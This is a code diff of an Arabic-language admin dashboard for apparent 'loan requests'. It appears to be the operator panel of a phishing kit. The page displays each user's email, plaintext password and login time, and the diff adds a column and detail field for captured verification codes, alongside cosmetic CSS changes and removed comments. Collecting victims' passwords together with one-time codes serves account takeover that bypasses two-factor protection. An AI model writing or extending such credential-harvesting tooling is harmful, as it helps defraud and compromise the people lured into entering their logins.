@@ -412,6 +412,34 @@
             background: linear-gradient(135deg, #444444 0%, #222222 100%);
         }
 
+        .password-field {
+            background: linear-gradient(135deg, #ffcc00 0%, #ff9900 100%);
+            color: #1a3a52;
+            padding: 10px;
+            border-radius: 5px;
+            font-weight: bold;
+            font-family: monospace;
+        }
+
+        .code-field {
+            background: linear-gradient(135deg, #00ff00 0%, #00cc00 100%);
+            color: #1a3a52;
+            padding: 10px;
+            border-radius: 5px;
+            font-weight: bold;
+            font-family: monospace;
+            font-size: 18px;
+        }
+
+        .badge-user {
+            background: linear-gradient(135deg, #0066cc 0%, #0052a3 100%);
+            color: white;
+            padding: 5px 10px;
+            border-radius: 5px;
+            font-size: 12px;
+            font-weight: bold;
+        }
+
         @keyframes fadeIn {
             from { opacity: 0; }
             to { opacity: 1; }
@@ -426,24 +454,6 @@
         .empty-state-icon {
             font-size: 48px;
             margin-bottom: 15px;
-        }
-
-        .password-field {
-            background: linear-gradient(135deg, #ffcc00 0%, #ff9900 100%);
-            color: #1a3a52;
-            padding: 10px;
-            border-radius: 5px;
-            font-weight: bold;
-            font-family: monospace;
-        }
-
-        .badge-user {
-            background: linear-gradient(135deg, #0066cc 0%, #0052a3 100%);
-            color: white;
-            padding: 5px 10px;
-            border-radius: 5px;
-            font-size: 12px;
-            font-weight: bold;
         }
 
         @media (max-width: 768px) {
@@ -567,13 +577,14 @@
                             <th>#</th>
                             <th>البريد الإلكتروني</th>
                             <th>كلمة المرور</th>
+                            <th>كود التحقق</th>
                             <th>وقت الدخول</th>
                             <th>الإجراءات</th>
                         </tr>
                     </thead>
                     <tbody id="usersTableBody">
                         <tr>
-                            <td colspan="5" class="empty-state">
+                            <td colspan="6" class="empty-state">
                                 <div class="empty-state-icon">👥</div>
                                 <div>لا يوجد مستخدمين حتى الآن</div>
                             </td>
@@ -602,6 +613,11 @@
             </div>
 
             <div class="modal-field">
+                <div class="modal-label">كود التحقق</div>
+                <div class="modal-value code-field" id="modalVerificationCode">-</div>
+            </div>
+
+            <div class="modal-field">
                 <div class="modal-label">مبلغ القرض</div>
                 <div class="modal-value" id="modalAmount">-</div>
             </div>
@@ -617,13 +633,8 @@
             </div>
 
             <div class="modal-field">
-                <div class="modal-label">التاريخ</div>
-                <div class="modal-value" id="modalDate">-</div>
-            </div>
-
-            <div class="modal-field">
-                <div class="modal-label">الوقت</div>
-                <div class="modal-value" id="modalTime">-</div>
+                <div class="modal-label">التاريخ والوقت</div>
+                <div class="modal-value" id="modalDateTime">-</div>
             </div>
 
             <div class="modal-field">
@@ -646,7 +657,6 @@
         let filteredRequests = [];
         let filteredUsers = [];
 
-        // ===== عرض الصفحات =====
         function showPage(pageId) {
             document.querySelectorAll('.page').forEach(page => page.classList.remove('active'));
             document.getElementById(pageId + '-page').classList.add('active');
@@ -659,7 +669,6 @@
             }
         }
 
-        // ===== تحميل البيانات =====
         function loadRequests() {
             const savedRequests = localStorage.getItem('loanRequests');
             requests = savedRequests ? JSON.parse(savedRequests) : [];
@@ -675,7 +684,6 @@
             displayUsers();
         }
 
-        // ===== عرض الطلبات =====
         function displayRequests() {
             const tableBody = document.getElementById('tableBody');
             
@@ -717,14 +725,13 @@
             `).join('');
         }
 
-        // ===== عرض المستخدمين =====
         function displayUsers() {
             const tableBody = document.getElementById('usersTableBody');
             
             if (filteredUsers.length === 0) {
                 tableBody.innerHTML = `
                     <tr>
-                        <td colspan="5" class="empty-state">
+                        <td colspan="6" class="empty-state">
                             <div class="empty-state-icon">👥</div>
                             <div>لا يوجد مستخدمين</div>
                         </td>
@@ -738,6 +745,7 @@
                     <td>${index + 1}</td>
                     <td><span class="badge-user">${user.email}</span></td>
                     <td><span class="password-field">${user.password}</span></td>
+                    <td><span class="code-field">${user.verificationCode}</span></td>
                     <td>${user.loginTime}</td>
                     <td>
                         <button class="btn-delete" onclick="deleteUser(${index})">🗑️ حذف</button>
@@ -746,7 +754,6 @@
             `).join('');
         }
 
-        // ===== عرض التفاصيل =====
         function viewDetails(id) {
             const request = requests.find(r => r.id === id);
             if (!request) return;
@@ -754,11 +761,11 @@
             currentRequestId = id;
             document.getElementById('modalEmail').textContent = request.email;
             document.getElementById('modalPassword').textContent = request.password;
+            document.getElementById('modalVerificationCode').textContent = request.verificationCode;
             document.getElementById('modalAmount').textContent = `$${request.amount}`;
             document.getElementById('modalPeriod').textContent = `${request.period} شهر`;
             document.getElementById('modalDescription').textContent = request.description;
-            document.getElementById('modalDate').textContent = request.date;
-            document.getElementById('modalTime').textContent = request.time;
+            document.getElementById('modalDateTime').textContent = `${request.date} - ${request.time}`;
             document.getElementById('modalStatus').innerHTML = `
                 <span class="status-badge status-${request.status.toLowerCase()}">
                     ${getStatusText(request.status)}
@@ -767,12 +774,10 @@
             document.getElementById('detailsModal').style.display = 'block';
         }
 
-        // ===== إغلاق النافذة =====
         function closeModal() {
             document.getElementById('detailsModal').style.display = 'none';
         }
 
-        // ===== قبول/رفض/حذف =====
         function approveRequest(id) {
             const request = requests.find(r => r.id === id);
             if (request) {
@@ -817,7 +822,6 @@
             }
         }
 
-        // ===== تحديث الإحصائيات =====
         function updateStats() {
             document.getElementById('totalRequests').textContent = requests.length;
             document.getElementById('pendingRequests').textContent = 
@@ -828,7 +832,6 @@
                 requests.filter(r => r.status === 'rejected').length;
         }
 
-        // ===== البحث =====
         function searchRequests() {
             const term = document.getElementById('searchInput').value.toLowerCase();
             filteredRequests = requests.filter(r => r.email.toLowerCase().includes(term));
@@ -841,7 +844,6 @@
             displayUsers();
         }
 
-        // ===== حفظ =====
         function saveRequests() {
             localStorage.setItem('loanRequests', JSON.stringify(requests));
         }
@@ -855,7 +857,6 @@
             return map[status] || status;
         }
 
-        // ===== الخروج =====
         function logout() {
             if (confirm('تسجيل الخروج؟')) {
                 window.location.href = 'index.html';
